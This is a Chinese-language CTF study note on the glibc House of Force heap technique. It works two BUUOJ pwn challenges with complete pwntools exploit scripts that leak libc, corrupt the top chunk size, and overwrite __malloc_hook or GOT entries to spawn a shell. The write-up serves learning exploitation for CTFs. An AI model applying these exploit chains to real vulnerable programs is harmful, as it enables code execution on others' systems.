# 优秀的学习文章
[关于house of force的学习总结 | ZIKH26](https://www.cnblogs.com/ZIKH26/articles/16533388.html)


# House Of Force利用
**libc-2.23和libc-2.27**
我的理解，
通过top chunk的分割去"逼近"到target_addr。

House Of Force的利用确实不大难，学习后能对堆的布局有更深刻的认识。

主要是这个利用条件太苛刻了：
1.能改top chunk的size位为-1（绕过remainder最大块检测）
2.能得到topchunk的地址（计算request_size）
3.malloc的size不受限制（一般很大）

`request_size = target_addr - 0x20(32位:0x10) - topchunk_addr`


# 例题

## gyctf_2020_force
[题目](https://buuoj.cn/challenges#gyctf_2020_force)

学习到的点:
1.申请超大chunk使得mmap分配，vmmap查看发现分配到了libc里面，所以能得到与libc的偏移，从而泄露libc。
2.HOF本质是对topchunk布局，利用申请的第一个chunk都是topchunk_addr-first_malloc_size处的地方来实现任意地址写。
3.又熟悉了调试方法，学会了`vmmap`查看整体内存的分配情况。
4.realloc调整下栈帧，根本没必要下断点进calloc看，直接爆破几个即可，+2,+4,+6...

Exp: (远程的,本地的realloc没调对。。)
```python
leak = add(0x200000,b'a')

# offset = 0x200FF0
libcbase = leak + 0x200FF0
info_addr("libcbase",libcbase)

ogs = [0x45216,0x4526a,0xf02a4,0xf1147]
og = libcbase + ogs[1]
info_addr("one_gadget",og)
malloc = libcbase + libc.sym['__malloc_hook']
realloc = libcbase + libc.sym['realloc']

# house of force
pl = p64(0)*3 + p64(0xffffffffffffffff)
leak = add(0x10,pl)
topchunk = leak + 0x10
info_addr("topchunk",topchunk)

# request_size = target_addr - 0x20 - victim
request_size = malloc - 0x20 - topchunk - 0x10
info_addr("size!!!",request_size)
add(request_size,b'aaaa')
addr = add(0x20,b'a'*8+p64(og)+p64(realloc+12))
#addr = add(0x20,b'a'*16+p64(og))

info_addr("realloc_hook",malloc-0x8)
info_addr("addr",addr)

p.sendlineafter('2:puts\n',str(1))
p.sendlineafter('size\n',str(0xFF))

p.interactive()
```
![image](HouseOfForce\images\3092507-20240710203101058-1718997373.png)

## bcloud_bctf_2016
[题目](https://buuoj.cn/challenges#bcloud_bctf_2016)

**好题！**



32位的堆，活久见。
emmm，漏洞点真不好找。
在输入name这里：
![image](HouseOfForce\images\3092507-20240711163712032-1569917762.png)

**strcpy**！！！会多拷贝一个`b'\x00'`空字节

这里调试看，
strcpy之前的堆布局
![image](HouseOfForce\images\3092507-20240711164826563-928621703.png)

我们填满0x40，strcpy后的堆布局
![image](HouseOfForce\images\3092507-20240711164945576-844668097.png)

可以看到一个off-by-null修改了topchunk的size
而且由于紧接着打印的是堆中的内容，而根据堆的布局可以看到填满后是能接着泄露`0x08f9f008`的，也就是topchunk的prev_size段。（printf遇空字节终止）
![image](HouseOfForce\images\3092507-20240711165606387-95576426.png)

同样的，后面输入Organization和Host的时候也存在溢出。
我们还是都填满0x40来看堆布局
![image](HouseOfForce\images\3092507-20240711170329244-304448501.png)

都是因为strcpy时，栈中没有`b'\x00'`来截断，导致溢出。

所以我们现在：
1. 可以控制topchunk的size
2. 知道topchunk的地址
3. malloc大小无限制
所以考虑 House Of Force，将p_content的内存空间申请出来。
漏洞利用思路：
这样就可以在bss的指针段写入free_got,puts_got这些，**然后edit把free_got的值改为puts_plt，然后free(puts_got)泄露libc**，再把free_got改为system，最后布置一个/bin/sh即可。

但还是有些细节，比如不能edit(0)（topchunk的size有问题）
然后就是不知道为什么本地打不通，但能打通远程。。。
Exp:
```python
free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

sa("name:\n",b'a'*0x40)

ru(b'a'*0x40)
leak = leak_address()
info_addr("leak",leak)
topchunk = leak + 0xd0

sa("Org:\n",b'b'*0x40)
sla("Host:\n",p64(0xffffffff))
info_addr("topchunk",topchunk)

target = 0x804B120 # p_content
add(target-0x10-topchunk,b"0")
add(0x20,p32(0)+p32(free_got)+p32(puts_got)+p32(target+0x10)+b'/bin/sh\x00')
edit(1,p32(puts_plt)) # free_got -> puts_plt
free(2) # puts(puts_got)
leak = leak_address()
info_addr("puts_addr",leak)

libcbase = leak - libc.sym['puts']
info_addr("libcbase",libcbase)
system = libcbase + libc.sym['system']

edit(1,p32(system))
free(3)


p.interactive()
```
本地：
![image](HouseOfForce\images\3092507-20240711175903765-407465516.png)

远程：
![image](HouseOfForce\images\3092507-20240711175458506-17811029.png)